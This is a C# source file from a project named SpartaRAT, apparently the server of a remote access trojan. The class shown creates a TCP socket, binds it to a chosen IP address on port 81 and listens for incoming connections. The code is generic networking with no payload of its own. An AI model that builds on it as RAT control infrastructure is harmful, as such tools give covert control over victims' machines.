﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;

namespace RATserverSparta.Socket
{
    public class SocketCreate
    {
        public static dynamic Create(string IpAddressValue, MainGUI instance)
        {
            try
            {
                IPAddress IpAddress = IPAddress.Parse(IpAddressValue);
                System.Net.Sockets.Socket Socket = new System.Net.Sockets.Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint LocalEndPoint = new IPEndPoint(IpAddress, 81); //IpAddress, Port
                Socket.Bind(LocalEndPoint);
                //Creating a messagebox new thread the will not block the running code
                new Thread(() => {
                    MessageBox.Show("Server Created - " + IpAddress.ToString() + ":81" +
                Environment.NewLine + "Notice: SpartaRAT allow listening to one ip address");
                }).Start();
                //Setting Listen function with a default backlog with the 10 value
                Socket.Listen(int.Parse(instance.listenBacklog.Text));
                return Socket;
            }
            catch
            {
                MessageBox.Show("Please select a host ip address at the Settings");
                return null;
            }
        }
    }
}
